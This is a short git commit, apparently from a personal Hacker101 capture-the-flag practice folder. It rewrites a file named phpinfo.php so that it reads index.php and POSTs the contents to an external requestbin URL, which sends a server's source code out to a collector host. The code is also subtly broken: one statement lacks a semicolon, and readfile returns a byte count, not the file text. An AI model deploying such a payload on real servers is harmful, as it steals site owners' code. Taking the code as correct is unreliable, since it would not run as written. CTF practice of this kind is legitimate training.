d3c8af8158e0025332792c8b02d95097b5e75b13
196Ikuchil <22634362+196Ikuchil@users.noreply.github.com>
2019-06-28 00:52:28 +0900

    hacker101

--- hacker101/php/phpinfo.php
+++ hacker101/php/phpinfo.php
@@ -1,4 +1,13 @@
 <?php
-    $result = file_get_contents('http://requestbin.fullcontact.com/14aagub1');
-    echo $result;
+$url = "http://requestbin.fullcontact.com/14aagub1";
+$source = readfile("index.php")
+$data = array(
+    'source' => $source
+);
+$content = http_build_query($data);
+$options = array('http' => array(
+    'method' => 'POST',
+    'content' => $content
+));
+$contents = file_get_contents($url, false, stream_context_create($options));
 ?>
